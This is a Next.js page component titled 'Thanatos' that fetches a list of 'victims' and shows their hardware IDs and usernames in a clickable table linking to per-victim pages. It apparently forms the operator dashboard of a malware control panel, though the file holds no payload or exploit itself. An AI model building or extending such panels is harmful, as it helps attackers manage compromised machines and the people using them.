import type { NextPage } from 'next'
import Head from 'next/head'
/* import Image from 'next/image' */
import styles from '../styles/Home.module.css'
import { DataTable } from 'mantine-datatable'
/* import { Text } from '@mantine/core' */
import { useEffect, useState } from 'react'
import { useRouter } from 'next/router'

const Home: NextPage = () => {
  const [victims, setVictims] = useState([]);
  const router = useRouter();

  useEffect(() => {
    fetch('/api/get_victims')
      .then(res => {
        return res.json()
      }).then(data => {
        setVictims(data.victims);
      })
  }, []);

  return (
    <div className={styles.container}>
      <Head>
        <title>Thanatos</title>
        <meta name="description" content="Generated by create next app" />
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <main className={styles.main}>
        <DataTable
          withBorder
          borderRadius="sm"
          withColumnBorders
          striped
          highlightOnHover
          // provide data
          records={victims}
          // define columns
          columns={[
            {
              accessor: 'hwid',
              // this column has a custom title
              title: 'Hardware ID',
              // right-align column
              textAlignment: 'right',
            },
            { accessor: 'username' },
            /* { */
            /*   accessor: 'party', */
            /*   // this column has custom cell data rendering */
            /*   render: ({ party }) => ( */
            /*     <Text weight={700} color={party === 'Democratic' ? 'blue' : 'red'}> */
            /*       {party.slice(0, 3).toUpperCase()} */
            /*     </Text> */
            /*   ), */
            /* }, */
            /* { accessor: 'bornIn' }, */
          ]}
          // execute this callback when a row is clicked
          onRowClick={({ username, hwid }) => {
            router.push('/victim/' + username + '-' + hwid);
          }}
        />
      </main>

      <footer className={styles.footer}>
        {/* <a */}
        {/*   href="https://vercel.com?utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app" */}
        {/*   target="_blank" */}
        {/*   rel="noopener noreferrer" */}
        {/* > */}
        {/*   Powered by{' '} */}
        {/*   <span className={styles.logo}> */}
        {/*     <Image src="/vercel.svg" alt="Vercel Logo" width={72} height={16} /> */}
        {/*   </span> */}
        {/* </a> */}
      </footer>
    </div>
  )
}

export default Home
